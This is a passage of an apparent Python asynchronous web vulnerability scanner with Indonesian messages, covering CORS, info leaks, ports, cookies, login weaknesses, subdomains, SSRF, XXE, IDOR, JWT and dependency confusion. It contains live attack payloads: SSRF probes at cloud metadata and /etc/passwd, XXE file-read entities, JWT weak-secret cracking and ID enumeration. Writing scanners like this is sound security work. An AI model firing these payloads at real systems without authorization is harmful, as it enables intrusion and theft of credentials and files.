            resp = await engine.get(url, headers={"Origin": origin})
            if not resp: return
            hdrs = {k.lower():v for k,v in resp["headers"].items()}
            acao = hdrs.get("access-control-allow-origin","")
            acac = hdrs.get("access-control-allow-credentials","")
            if acao == "*":
                result.add(Finding(self.NAME,Severity.MEDIUM,"CORS Wildcard",
                    "Semua origin diizinkan.","ACAO: *",
                    "Whitelist origin spesifik.",5.4,"CWE-942",url,["cors"]))
            elif acao == origin and acac.lower() == "true":
                result.add(Finding(self.NAME,Severity.HIGH,
                    "CORS: Origin Reflection + Credentials",
                    "Origin direfleksikan + credentials diizinkan.",
                    f"Origin: {origin}\nACAO: {acao}\nACAC: {acac}",
                    "Validasi origin ketat.",8.1,"CWE-942",url,["cors"]))
        await asyncio.gather(*[check(o) for o in origins], return_exceptions=True)

class AsyncInfoDisclosure(AsyncModule):
    NAME = "Info Disclosure"
    PATS = {
        r"traceback \(most recent": ("Python Traceback",Severity.MEDIUM),
        r"fatal error.*php":        ("PHP Fatal Error",  Severity.MEDIUM),
        r"warning.*mysql_":         ("MySQL Warning",    Severity.HIGH),
        r"ora-\d{5}":               ("Oracle Error",     Severity.HIGH),
        r"password\s*[=:]\s*\S{4,}":("Password Exposed",Severity.CRITICAL),
        r"api[_-]?key\s*[=:]\s*\w{20,}":("API Key",    Severity.CRITICAL),
        r"aws_access_key_id":       ("AWS Key",          Severity.CRITICAL),
        r"-----BEGIN.*PRIVATE KEY": ("Private Key",      Severity.CRITICAL),
        r"APP_DEBUG=true":          ("Debug Mode On",    Severity.HIGH),
    }
    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        resps = await asyncio.gather(
            engine.get(url),
            engine.get(url+"/v71-404-test"),
            engine.get(url+"?id='&q=<test>"),
            return_exceptions=True)
        # FIX 5: Catat exception dari gather — jangan buang diam-diam
        for resp, lbl in zip(resps, ["main","404","error"]):
            if isinstance(resp, Exception):
                logger.debug(f"InfoDisclosure gather error [{lbl}]: {resp}")
                result.errors.append(f"Info Disclosure [{lbl}]: {resp}")
            elif resp:
                self._scan(resp["body"], f"{url}/{lbl}", result)
    def _scan(self, body, url, result):
        seen = set()
        for pat,(title,sev) in self.PATS.items():
            if title in seen: continue
            m2 = re.search(pat, body, re.I)
            if m2:
                seen.add(title)
                snip = re.sub(r'\s+',' ',
                    body[max(0,m2.start()-50):m2.end()+60])
                result.add(Finding(self.NAME,sev,title,
                    "Info sensitif terekspos.",
                    f"URL: {url}\n...{snip[:200]}...",
                    "Tampilkan error generik.",
                    9.0 if sev==Severity.CRITICAL else 5.5,
                    "CWE-200",url,["info"]))

# FIX: asyncio.open_connection — ganti ThreadPoolExecutor
class AsyncPortScanner(AsyncModule):
    NAME = "Port Scanner"
    PORTS = {
        21:("FTP",Severity.HIGH,"FTP tidak terenkripsi"),
        22:("SSH",Severity.INFO,"SSH terbuka"),
        23:("Telnet",Severity.CRITICAL,"Telnet plaintext!"),
        80:("HTTP",Severity.INFO,"HTTP terbuka"),
        443:("HTTPS",Severity.INFO,"HTTPS terbuka"),
        1433:("MSSQL",Severity.HIGH,"MSSQL terekspos"),
        2375:("Docker",Severity.CRITICAL,"Docker API tanpa TLS!"),
        3306:("MySQL",Severity.HIGH,"MySQL terekspos"),
        3389:("RDP",Severity.HIGH,"RDP terekspos"),
        5432:("PostgreSQL",Severity.HIGH,"PostgreSQL terekspos"),
        6379:("Redis",Severity.CRITICAL,"Redis tanpa auth!"),
        8080:("HTTP-Alt",Severity.MEDIUM,"HTTP alt port"),
        8888:("Jupyter",Severity.CRITICAL,"Jupyter Notebook!"),
        9200:("Elastic",Severity.CRITICAL,"Elasticsearch tanpa auth!"),
        27017:("MongoDB",Severity.CRITICAL,"MongoDB tanpa auth!"),
    }

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        host = urllib.parse.urlparse(url).netloc.split(":")[0]

        # FIX 2: Timeout adaptif — port umum lebih sabar, lainnya lebih ketat
        custom_timeout = getattr(engine, '_port_timeout', None)

        async def scan_async(port) -> Tuple[int, bool]:
            """
            FIX: asyncio.open_connection — ringan, true async.
            Timeout adaptif: 2s untuk port umum, 1s untuk lainnya.
            --port-timeout override semua.
            """
            timeout_val = (custom_timeout if custom_timeout
                           else 2.0 if port in (80, 443, 8080, 8443) else 1.0)
            try:
                fut = asyncio.open_connection(host, port)
                reader, writer = await asyncio.wait_for(fut, timeout=timeout_val)
                writer.close()
                try: await writer.wait_closed()
                except: pass
                return port, True
            except (asyncio.TimeoutError, ConnectionRefusedError,
                    OSError, Exception):
                return port, False

        results = await asyncio.gather(
            *[scan_async(p) for p in self.PORTS],
            return_exceptions=True)
        for _item in results:
            if isinstance(_item, Exception): continue
            port, open_ = _item
            if open_:
                svc,sev,desc = self.PORTS[port]
                cvss = (9.5 if sev==Severity.CRITICAL else
                        7.0 if sev==Severity.HIGH else 4.0)
                result.add(Finding(self.NAME,sev,f"Port {port}/{svc} Terbuka",
                    desc,f"host={host} port={port} OPEN",
                    f"Tutup port {port} via firewall.",cvss,"CWE-284",
                    f"{host}:{port}",["ports"]))

class AsyncCookieAnalyzer(AsyncModule):
    NAME = "Cookie Security"
    SENSITIVE = ["session","auth","token","jwt","csrf","login"]
    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        resp = await engine.get(url)
        if not resp: return
        raw = resp["headers"].get("Set-Cookie","").lower()
        for name in resp["cookies"]:
            is_s = any(s in name.lower() for s in self.SENSITIVE)
            sev  = Severity.HIGH if is_s else Severity.MEDIUM
            if "httponly" not in raw:
                result.add(Finding(self.NAME,sev,
                    f"Cookie '{name}' Tanpa HttpOnly",
                    "Rentan pencurian via XSS.",
                    f"Set-Cookie: {name} (no HttpOnly)",
                    "Tambahkan HttpOnly.",4.3,"CWE-1004",url,["cookies"]))
            if url.startswith("https://") and "secure" not in raw:
                result.add(Finding(self.NAME,sev,
                    f"Cookie '{name}' Tanpa Secure","Bisa dikirim via HTTP.",
                    f"Set-Cookie: {name} (no Secure)",
                    "Tambahkan Secure.",4.3,"CWE-614",url,["cookies"]))
            if "samesite" not in raw:
                result.add(Finding(self.NAME,Severity.LOW,
                    f"Cookie '{name}' Tanpa SameSite","Rentan CSRF.",
                    f"Cookie {name} — SameSite tidak diset.",
                    "Tambahkan SameSite=Strict.",3.1,"CWE-352",url,
                    ["cookies","auth"]))

class AsyncWeakAuth(AsyncModule):
    NAME = "Weak Auth"
    PATHS = ["/login","/signin","/wp-login.php","/admin/login","/auth/login"]
    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        base = url.rstrip("/")
        async def check(path):
            resp = await engine.get(base+path)
            if not resp or resp["status"] not in (200,302): return
            body = resp["body"].lower()
            if "<form" not in body or "password" not in body: return
            if not any(x in body for x in ["captcha","recaptcha","hcaptcha"]):
                result.add(Finding(self.NAME,Severity.MEDIUM,
                    f"Login Tanpa CAPTCHA: {path}","Rentan automated login.",
                    f"URL: {base+path}",
                    "Implementasikan CAPTCHA.",5.3,"CWE-307",base+path,["auth"]))
            if not any(x in body for x in
                       ["csrf","_token","authenticity_token"]):
                result.add(Finding(self.NAME,Severity.HIGH,
                    f"Login Tanpa CSRF Token: {path}","Rentan CSRF.",
                    "Tidak ada CSRF token.",
                    "Implementasikan CSRF token.",6.5,"CWE-352",base+path,
                    ["auth","csrf"]))
            posts = await asyncio.gather(*[
                engine.post(base+path,
                    data={"username":"testuser","password":"wrongpass!"})
                for _ in range(5)],
            return_exceptions=True)
            statuses = [p["status"] for p in posts if p and not isinstance(p, Exception)]
            if (statuses and
                    not any(s in statuses for s in [429,503]) and
                    all(s in (200,302) for s in statuses)):
                result.add(Finding(self.NAME,Severity.HIGH,
                    f"Tidak Ada Rate Limiting: {path}",
                    f"5 concurrent POST tidak di-block ({statuses}).",
                    f"Responses: {statuses}",
                    "Implementasikan rate limiting.",7.5,"CWE-307",base+path,["auth"]))
        await asyncio.gather(*[check(p) for p in self.PATHS], return_exceptions=True)

# FIX: reuse resolver + DNS rate limiting dengan Semaphore
class AsyncSubdomainEnum(AsyncModule):
    NAME = "Subdomain Enum"
    DEFAULT = ["www","mail","dev","test","staging","api","admin","vpn",
               "blog","shop","ftp","smtp","portal","beta","old","backup",
               "git","jenkins","wiki","docs","status","monitor","cdn"]
    DNS_CONCURRENCY = 20  # max concurrent DNS queries

    def __init__(self, wordlist=None):
        self.wordlist = wordlist or self.DEFAULT

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        domain = urllib.parse.urlparse(url).netloc
        parts  = domain.split(".")
        base_d = ".".join(parts[-2:]) if len(parts) > 2 else domain

        if AIODNS_OK:
            found = await self._resolve_aiodns(base_d)
        else:
            found = await self._resolve_socket(base_d)

        if found: result.subdomains = [f"{t} ({ip})" for t,ip in found]
        for target, ip in found:
            for scheme in ["https","http"]:
                resp = await engine.get(f"{scheme}://{target}")
                if resp and resp["status"] < 500:
                    is_dev = any(x in target for x in
                                ["dev","test","staging","beta","old","backup"])
                    sev = Severity.MEDIUM if is_dev else Severity.INFO
                    result.add(Finding(self.NAME,sev,
                        f"Subdomain Aktif: {target}",
                        "Non-prod subdomain sering kurang secure!"
                        if is_dev else "",
                        f"{scheme}://{target} ({ip}) → {resp['status']}",
                        "Terapkan security controls yang sama.",
                        3.0 if is_dev else 0,"CWE-200",
                        f"{scheme}://{target}",
                        ["subdomain","dev" if is_dev else "info"]))
                    break

    async def _resolve_aiodns(self, base_d: str):
        """
        FIX: Satu resolver instance di-reuse untuk semua query.
        Semaphore membatasi concurrency agar tidak kena rate limit DNS.
        """
        resolver = aiodns.DNSResolver()  # satu instance, di-reuse
        sem = asyncio.Semaphore(self.DNS_CONCURRENCY)

        async def resolve_one(sub):
            fqdn = f"{sub}.{base_d}"
            async with sem:
                try:
                    res = await resolver.gethostbyname(fqdn, socket.AF_INET)
                    addrs = getattr(res, "addresses", [])
                    return fqdn, (addrs[0] if addrs else "resolved")
                except:
                    return None, None

        pairs = await asyncio.gather(
            *[resolve_one(s) for s in self.wordlist],
            return_exceptions=True)
        return [(t,ip) for res in pairs
                if not isinstance(res,Exception)
                for t,ip in [res] if t]

    async def _resolve_socket(self, base_d: str):
        """
        FIX 11: Fallback DNS via socket.gethostbyname.
        Semaphore membatasi konkurensi agar tidak membanjiri thread pool.
        """
        loop = asyncio.get_event_loop()
        # FIX 11: Tambah semaphore — sama seperti _resolve_aiodns
        sem  = asyncio.Semaphore(self.DNS_CONCURRENCY)

        def _single_lookup(subdomain):
            # Sync OK — fungsi ini dijalankan di thread pool via _bounded
            try:
                full_host = f"{subdomain}.{base_d}"
                return full_host, socket.gethostbyname(full_host)
            except Exception:
                return None, None

        async def _bounded(sub):
            async with sem:
                return await loop.run_in_executor(None, _single_lookup, sub)

        pairs = await asyncio.gather(
            *[_bounded(s) for s in self.wordlist],
            return_exceptions=True
        )
        return [(t, ip) for _r in pairs
                if not isinstance(_r, Exception)
                for t, ip in [_r] if t and ip]

# ─────────────────────────────────────────────
#  v7 NEW: SSRF DETECTOR
#  FIX: probes berbahaya hanya jika --aggressive
# ─────────────────────────────────────────────
class AsyncSSRFDetector(AsyncModule):
    NAME = "SSRF"

    # Safe probes — selalu dijalankan
    SAFE_PROBES = [
        ("http://127.0.0.1/",       "Localhost HTTP"),
        ("http://0.0.0.0/",         "Null IP"),
        ("http://localhost:80/",     "Localhost:80"),
        ("http://[::1]/",           "IPv6 Localhost"),
    ]
    # Dangerous probes — hanya jika --aggressive
    # FIX 8: Tambah gopher, ftp, ldap, jar untuk cakupan SSRF lebih luas
    AGGRESSIVE_PROBES = [
        ("http://169.254.169.254/latest/meta-data/","AWS Metadata"),
        ("http://169.254.169.254/",               "AWS/Azure Metadata"),
        ("http://metadata.google.internal/computeMetadata/v1/","GCP Metadata"),
        ("dict://127.0.0.1:11211/stat",           "Memcached SSRF"),
        ("file:///etc/passwd",                    "Local File (aggressive)"),
        ("gopher://127.0.0.1:8080/_test",         "Gopher SSRF"),
        ("ftp://127.0.0.1:21/",                   "FTP SSRF"),
        ("ldap://127.0.0.1:389/",                 "LDAP SSRF"),
        ("jar:http://127.0.0.1/!/",               "JAR SSRF"),
    ]
    INDICATORS = [
        r"root:x:0:0", r"daemon:x:1:", r"ami-id", r"instance-id",
        r"computeMetadata", r"iam/security-credentials", r"STAT\s+pid",
    ]
    URL_KEYWORDS = [
        "url","uri","path","src","source","redirect","dest","destination",
        "target","link","img","fetch","load","file","resource","callback",
        "host","site","domain","proxy","request","next","return","returnurl",
        "goto","image","open","ref","continue","location","href",
    ]

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        resp = await engine.get(url)
        if not resp: return
        targets = self._find_url_params(url, resp["body"])
        if not targets: return

        probes = self.SAFE_PROBES + (self.AGGRESSIVE_PROBES if aggressive else [])
        if not aggressive:
            result.add(Finding(self.NAME, Severity.INFO,
                "SSRF: Mode Aman — Gunakan --aggressive untuk probe metadata",
                "Probe berbahaya (AWS/GCP metadata, file://) dinonaktifkan "
                "untuk mencegah SSRF ke internal network yang tidak disengaja.",
                f"URL params yang terdeteksi: {[list(t[2].keys()) for t in targets[:3]]}",
                "Jalankan dengan --aggressive untuk full probe.",
                0,"",url,["ssrf","info"]))

        for t_url, method, params in targets[:4]:
            baseline = (await engine.get(t_url, params=params) if method=="GET"
                        else await engine.post(t_url, data=params))
            if not baseline: continue
            for probe, label in probes[:5]:
                test_p = {k: probe for k in params}
                r2 = (await engine.get(t_url, params=test_p) if method=="GET"
                      else await engine.post(t_url, data=test_p))
                if not r2 or PayloadMutator.is_blocked(r2): continue
                body = r2["body"]
                for pat in self.INDICATORS:
                    if re.search(pat, body, re.I|re.S):
                        result.add(Finding(self.NAME, Severity.CRITICAL,
                            f"SSRF Terdeteksi — {label}",
                            "Server request ke URL internal yang dikontrol penyerang.",
                            f"URL: {t_url}\nProbe: {probe}\nMatch: {pat}\n"
                            f"Response: {body[:200]}",
                            "Implementasikan URL allowlist. "
                            "Blokir RFC-1918 & metadata IPs.",
                            9.8,"CWE-918",t_url,["ssrf"]))
                        return
                # Anomaly detection
                bl_len = len(baseline["body"])
                if (r2["status"] == 200 and len(body) > 200 and
                        abs(len(body)-bl_len) > max(100, bl_len*0.3)):
                    result.add(Finding(self.NAME, Severity.HIGH,
                        f"Potensi SSRF — {label}",
                        "Parameter menerima probe URL — respons berbeda signifikan.",
                        f"URL: {t_url}\nProbe: {probe}\n"
                        f"Baseline: {bl_len}b → Probe: {len(body)}b",
                        "Whitelist URL yang diizinkan.",7.5,"CWE-918",t_url,["ssrf"]))
                    return

    def _find_url_params(self, url, body):
        targets = []
        parsed = urllib.parse.urlparse(url)
        if parsed.query:
            params = dict(urllib.parse.parse_qsl(parsed.query))
            url_p = {k: v for k,v in params.items()
                     if any(kw in k.lower() for kw in self.URL_KEYWORDS)}
            if url_p: targets.append((url, "GET", url_p))
        try:
            soup = BeautifulSoup(body, "html.parser")
            for form in soup.find_all("form")[:3]:
                action = form.get("action","")
                method = form.get("method","get").upper()
                furl   = urllib.parse.urljoin(url, action) if action else url
                inputs = {}
                for inp in form.find_all("input"):
                    name = inp.get("name","")
                    if not name or inp.get("type") in \
                       ("submit","file","button","hidden"): continue
                    if any(kw in name.lower() for kw in self.URL_KEYWORDS):
                        inputs[name] = inp.get("value","http://example.com")
                if inputs: targets.append((furl, method, inputs))
        except: pass
        return targets

# ─────────────────────────────────────────────
#  v7 NEW: XXE DETECTOR
#  FIX: multipart/form-data vector + --aggressive gate
# ─────────────────────────────────────────────
class AsyncXXEDetector(AsyncModule):
    NAME = "XXE"

    XXE_PAYLOADS = [
        ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><root>&xxe;</root>""",
         "SSRF via XXE (safe probe)"),
        ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/">%xxe;]><root/>""",
         "Blind XXE parameter entity"),
    ]
    XXE_AGGRESSIVE = [
        ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
         "File Read (etc/passwd)"),
        ("""<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>""",
         "File Read (hostname)"),
    ]
    INDICATORS = [
        r"root:x:0:0", r"daemon:x:1:", r"ami-id", r"instance-id"]

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        payloads = self.XXE_PAYLOADS + (self.XXE_AGGRESSIVE if aggressive else [])
        xml_endpoints = await self._find_xml_endpoints(engine, url)
        for ep_url, method, ctype in xml_endpoints:
            for payload, label in payloads:
                r2 = await engine.post(
                    ep_url, data=payload,
                    headers={"Content-Type": ctype})
                if not r2 or PayloadMutator.is_blocked(r2): continue
                body = r2["body"]
                for pat in self.INDICATORS:
                    if re.search(pat, body, re.I|re.S):
                        result.add(Finding(self.NAME, Severity.CRITICAL,
                            f"XXE Injection — {label}",
                            "External entity processing aktif.",
                            f"URL: {ep_url}\nPayload: {label}\n"
                            f"Response: {body[:300]}",
                            "Disable external entity. Gunakan defusedxml.",
                            9.1,"CWE-611",ep_url,["xxe","injection"]))
                        return
                # Error-based detection
                if re.search(r"(xml|entity|external|DOCTYPE|parse.?error)",
                             body, re.I):
                    result.add(Finding(self.NAME, Severity.MEDIUM,
                        "XXE — XML Parser Error (Possible Blind)",
                        "XML parser merespons entity — kemungkinan blind XXE.",
                        f"URL: {ep_url}\nPayload: {label}\n"
                        f"Status: {r2['status']}\nSnippet: {body[:200]}",
                        "Disable external entity di XML parser.",
                        6.5,"CWE-611",ep_url,["xxe","blind"]))
                    break

    async def _find_xml_endpoints(self, engine, url):
        """
        FIX: Tambahkan multipart/form-data dan SVG upload vector.
        """
        endpoints = []
        base = url.rstrip("/")
        xml_paths = ["/api","/api/v1","/api/v2","/soap","/wsdl",
                     "/xmlrpc.php","/service","/ws","/rpc",
                     "/import","/upload","/parse"]
        for path in xml_paths:
            resp = await engine.get(base+path)
            if resp and resp["status"] < 405:
                # Try application/xml
                endpoints.append((base+path, "POST", "application/xml"))
                # Also try text/xml (SOAP)
                endpoints.append((base+path, "POST", "text/xml"))
        # Check main URL
        r2 = await engine.post(url, data="<test/>",
                               headers={"Content-Type":"application/xml"})
        if r2 and r2["status"] not in (404,405,406):
            endpoints.append((url,"POST","application/xml"))
        # SVG upload vector (XXE via SVG)
        svg_payload = ("""<?xml version="1.0"?>"""
                       """<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>"""
                       """<svg xmlns="http://www.w3.org/2000/svg">"""
                       """<text>&xxe;</text></svg>""")
        for path in ["/upload","/avatar","/import"]:
            endpoints.append((base+path,"POST","image/svg+xml"))
        return endpoints[:8]

# ─────────────────────────────────────────────
#  v7 NEW: IDOR CHECKER
#  FIX: field-level verification, bukan hanya similarity
# ─────────────────────────────────────────────
class AsyncIDORChecker(AsyncModule):
    SCAN_ALL_TARGETS = True
    NAME = "IDOR"
    ID_KEYWORDS = [
        "id","user","uid","account","profile","order","item","record",
        "doc","file","pid","oid","rid","user_id","account_id","post_id",
        "invoice","ticket","customer","member",
    ]
    # Regex untuk data yang seharusnya private
    SENSITIVE_FIELDS = re.compile(
        r'"(?:email|username|name|phone|address|balance|credit|secret'
        r'|password|token|api_key|ssn|dob|birthdate)":\s*"([^"]{3,})"',
        re.I)

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        resp = await engine.get(url)
        if not resp: return
        targets = self._find_id_params(url, resp["body"])
        for t_url, method, params in targets[:5]:
            await self._check_idor(engine, result, t_url, method, params)

    async def _check_idor(self, engine, result, url, method, params):
        base_resp = (await engine.get(url,params=params) if method=="GET"
                     else await engine.post(url,data=params))
        if not base_resp or base_resp["status"] not in (200,201): return
        bl_body = base_resp["body"]

        # Ekstrak nilai field sensitif dari response asli
        bl_sensitive = set(self.SENSITIVE_FIELDS.findall(bl_body))

        for param_key in list(params.keys())[:3]:
            original_val = params[param_key]
            try: orig_int = int(original_val)
            except: continue

            test_ids = [orig_int+1, orig_int-1, 1, 2, 100]
            test_ids = [tid for tid in test_ids if 0 < tid != orig_int][:4]

            responses = await asyncio.gather(
                *[self._fetch_id(engine, url, method, params, param_key, tid)
                  for tid in test_ids],
            return_exceptions=True)

            for _resp_item in responses:
                if isinstance(_resp_item, Exception): continue
                tid, r2 = _resp_item
                if not r2 or r2["status"] not in (200,201): continue
                body2 = r2["body"]
                sim   = Sim.ratio(bl_body, body2)

                # FIX: Cek apakah ada PERUBAHAN nilai field sensitif
                # (bukan sekadar struktur response yang berbeda)
                r2_sensitive = set(self.SENSITIVE_FIELDS.findall(body2))
                new_sensitive_values = r2_sensitive - bl_sensitive

                # Struktur sama (sim > 0.3) tapi nilai sensitif berbeda
                if (0.3 < sim < 0.93 and
                        len(body2) > 100 and
                        new_sensitive_values):
                    result.add(Finding(
                        self.NAME, Severity.HIGH,
                        f"IDOR Terkonfirmasi — param '{param_key}'",
                        f"ID={tid} mengembalikan data sensitif milik user lain. "
                        "Tidak ada ownership validation.",
                        f"URL: {url}\nParam: {param_key}\n"
                        f"ID asli: {original_val} → Test ID: {tid}\n"
                        f"Data sensitif berbeda: {list(new_sensitive_values)[:3]}\n"
                        f"Similarity: {sim:.3f}",
                        "Validasi kepemilikan di server-side. Gunakan UUID.",
                        8.5,"CWE-639",url,["idor","auth"]))
                    return
                # Fallback: hanya similarity (lower confidence)
                elif (0.35 < sim < 0.90 and len(body2) > 150 and
                      abs(len(body2)-len(bl_body)) < max(len(bl_body),300)):
                    result.add(Finding(
                        self.NAME, Severity.MEDIUM,
                        f"Potensi IDOR — param '{param_key}' (perlu verifikasi manual)",
                        f"ID={tid} mengembalikan respons berbeda tapi tidak ada "
                        "field sensitif yang terdeteksi. Perlu verifikasi manual.",
                        f"URL: {url}\nParam: {param_key}\n"
                        f"ID asli: {original_val} → Test ID: {tid}\n"
                        f"Similarity: {sim:.3f}",
                        "Verifikasi manual: apakah data user lain bisa diakses?",
                        5.4,"CWE-639",url,["idor","needs-verify"]))
                    return

    async def _fetch_id(self, engine, url, method, params, param_key, tid):
        test_p = {**params, param_key: str(tid)}
        r2 = (await engine.get(url, params=test_p) if method=="GET"
              else await engine.post(url, data=test_p))
        return tid, r2

    def _find_id_params(self, url, body):
        targets = []
        parsed = urllib.parse.urlparse(url)
        if parsed.query:
            params = dict(urllib.parse.parse_qsl(parsed.query))
            id_p = {k: v for k,v in params.items()
                    if (any(kw == k.lower() or k.lower().endswith("_id") or
                            k.lower().endswith("id")
                            for kw in self.ID_KEYWORDS)) and v.isdigit()}
            if id_p: targets.append((url,"GET",id_p))
        path = urllib.parse.urlparse(url).path
        for pid in re.findall(r'/(\d+)(?:/|$)', path):
            targets.append((url,"GET",{"id":pid}))
        try:
            soup = BeautifulSoup(body,"html.parser")
            for form in soup.find_all("form")[:3]:
                action = form.get("action","")
                method = form.get("method","get").upper()
                furl   = urllib.parse.urljoin(url, action) if action else url
                inputs = {}
                for inp in form.find_all("input"):
                    name = inp.get("name",""); val = inp.get("value","")
                    if not name or inp.get("type") in ("submit","file","button"):
                        continue
                    if (any(kw in name.lower() for kw in self.ID_KEYWORDS)
                            and val.isdigit()):
                        inputs[name] = val
                if inputs: targets.append((furl, method, inputs))
        except: pass
        return targets

# ─────────────────────────────────────────────
#  v7 NEW: JWT ANALYZER
#  FIX: explicit disclaimer "claims only, no signature verify"
# ─────────────────────────────────────────────
class AsyncJWTAnalyzer(AsyncModule):
    NAME = "JWT Analyzer"
    DISCLAIMER = (
        "⚠️  DISCLAIMER: Tool ini hanya men-decode claims JWT tanpa "
        "memverifikasi signature. Temuan ini berbasis analisis struktural, "
        "bukan bukti exploit. Verifikasi manual diperlukan."
    )
    WEAK_SECRETS = [
        "secret","password","123456","admin","test","key","jwt","token",
        "auth","private","secret123","mysecret","changeme","pass",
        "12345","abc123","guest","master","root","your-secret-key",
        "supersecret","jwtpassword","hs256","your-256-bit-secret","",
    ]
    JWT_PATTERN = re.compile(
        r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        resp = await engine.get(url)
        if not resp: return
        jwts: List[Tuple[str,str]] = []
        for m in self.JWT_PATTERN.finditer(resp["body"]):
            jwts.append(("response body", m.group()))
        for name, val in resp.get("cookies",{}).items():
            if self._is_jwt(val): jwts.append((f"cookie:{name}", val))
        for hname, hval in resp.get("headers",{}).items():
            if hname.lower() in ("authorization","x-auth-token","x-access-token"):
                token = hval.replace("Bearer ","").strip()
                if self._is_jwt(token):
                    jwts.append((f"header:{hname}", token))
        seen: Set[str] = set()
        for location, token in jwts[:10]:
            if token in seen: continue
            seen.add(token)
            self._analyze_jwt(token, location, url, result)

    def _is_jwt(self, t: str) -> bool:
        parts = t.split(".")
        return (len(parts)==3 and parts[0].startswith("eyJ")
                and parts[1].startswith("eyJ"))

    def _b64d(self, s: str) -> bytes:
        s = s.rstrip("=")
        pad = 4 - len(s)%4
        if pad != 4: s += "="*pad
        return base64.urlsafe_b64decode(s)

    def _analyze_jwt(self, token: str, location: str,
                     url: str, result: ScanResult):
        parts = token.split(".")
        if len(parts) != 3: return
        try:    header  = json.loads(self._b64d(parts[0]))
        except: return
        try:    payload = json.loads(self._b64d(parts[1]))
        except: payload = {}
        alg = str(header.get("alg","")).upper()

        # alg:none
        if alg in ("NONE",""):
            result.add(Finding(self.NAME, Severity.CRITICAL,
                "JWT: Algorithm 'none' — Auth Bypass Possible",
                f"JWT alg:none ditemukan. Signature tidak diverifikasi.\n"
                f"{self.DISCLAIMER}",
                f"Location: {location}\nHeader: {json.dumps(header)}\n"
                f"Payload: {json.dumps(payload)[:300]}",
                "Tolak alg:none. Whitelist algoritma (HS256/RS256).",
                9.8,"CWE-345",url,["jwt","alg-none","critical"]))

        # HMAC weak secret
        elif alg in ("HS256","HS384","HS512"):
            hmap  = {"HS256":"sha256","HS384":"sha384","HS512":"sha512"}
            halg  = hmap.get(alg,"sha256")
            msg   = f"{parts[0].rstrip('=')}.{parts[1].rstrip('=')}".encode()
            sig   = parts[2]
            cracked = None
            for secret in self.WEAK_SECRETS:
                try:
                    exp = base64.urlsafe_b64encode(
                        hmac_lib.new(secret.encode(), msg, halg).digest()
                    ).rstrip(b"=").decode()
                    if exp == sig:
                        cracked = secret; break
                except: pass
            if cracked is not None:
                result.add(Finding(self.NAME, Severity.CRITICAL,
                    f"JWT: Weak HMAC Secret — '{cracked}'",
                    f"JWT secret di-crack: '{cracked}'. Token dapat dipalsukan.\n"
                    f"{self.DISCLAIMER}",
                    f"Location: {location}\nAlgorithm: {alg}\n"
                    f"Secret: '{cracked}'\nPayload: {json.dumps(payload)[:250]}",
                    "Ganti secret dengan 256-bit random. Rotate semua token.",
                    9.8,"CWE-521",url,["jwt","weak-secret"]))
            else:
                result.add(Finding(self.NAME, Severity.INFO,
                    f"JWT HMAC Token — {alg} (secret tidak di-crack)",
                    f"JWT HMAC ditemukan. Secret tidak ada di daftar umum.\n"
                    f"{self.DISCLAIMER}",
                    f"Location: {location}\nClaims: {list(payload.keys())}",
                    "Pastikan secret ≥256 bit dan acak.",0,"",url,["jwt"]))

        # RSA — algorithm confusion hint
        elif alg in ("RS256","RS384","RS512","ES256","ES384","ES512"):
            result.add(Finding(self.NAME, Severity.MEDIUM,
                f"JWT: {alg} — Cek Algorithm Confusion Attack",
                f"RSA/EC JWT. Rentan algorithm confusion jika server tidak "
                f"strict validasi alg.\n{self.DISCLAIMER}",
                f"Location: {location}\nAlg: {alg}\n"
                f"Claims: {json.dumps(payload)[:200]}",
                "Whitelist algoritma eksplisit di server.",
                6.5,"CWE-327",url,["jwt","algorithm-confusion"]))

        # Missing exp
        exp = payload.get("exp")
        if exp is None:
            result.add(Finding(self.NAME, Severity.MEDIUM,
                "JWT: Tidak Ada 'exp' Claim",
                f"Token valid selamanya.\n{self.DISCLAIMER}",
                f"Location: {location}\nClaims: {json.dumps(payload)[:200]}",
                "Tambahkan 'exp' claim (TTL wajar).",5.4,"CWE-613",url,
                ["jwt","no-expiry"]))
        elif exp and time.time() > exp:
            result.add(Finding(self.NAME, Severity.LOW,
                "JWT: Token Expired Ditemukan",
                f"Expired token dikirim ke client.\n{self.DISCLAIMER}",
                f"exp: {exp} (expired {int(time.time()-exp)}s ago)",
                "Validasi exp setiap request.",3.1,"CWE-613",url,["jwt"]))

        # Sensitive payload
        sensitive_keys = {"password","secret","key","api_key","credit_card"}
        found_s = [k for k in payload if k.lower() in sensitive_keys]
        if found_s:
            result.add(Finding(self.NAME, Severity.HIGH,
                f"JWT: Data Sensitif dalam Payload — {found_s}",
                f"Payload JWT tidak terenkripsi (Base64 only).\n{self.DISCLAIMER}",
                f"Location: {location}\nKeys: {found_s}",
                "Jangan simpan data sensitif di JWT. Gunakan JWE.",
                7.5,"CWE-200",url,["jwt","sensitive"]))

# ─────────────────────────────────────────────
#  v7 NEW: DEPENDENCY CONFUSION CHECKER
# ─────────────────────────────────────────────
class AsyncDepConfusionChecker(AsyncModule):
    NAME = "Dep Confusion"
    MANIFEST_PATHS = [
        "/package.json","/requirements.txt","/requirements-dev.txt",
        "/composer.json","/Gemfile","/go.mod","/pom.xml",
        "/build.gradle","/.npmrc","/setup.py","/pyproject.toml",
        "/Pipfile","/cargo.toml",
    ]
    INTERNAL_KEYWORDS = [
        "internal","private","corp","company","lib-","util-","core-",
        "common-","shared-","base-","local-","dev-","my-",
    ]

    async def run_async(self, engine, result, url, waf_info, aggressive=False):
        base = url.rstrip("/")
        for path in self.MANIFEST_PATHS:
            resp = await engine.get(base+path, allow_redirects=False)
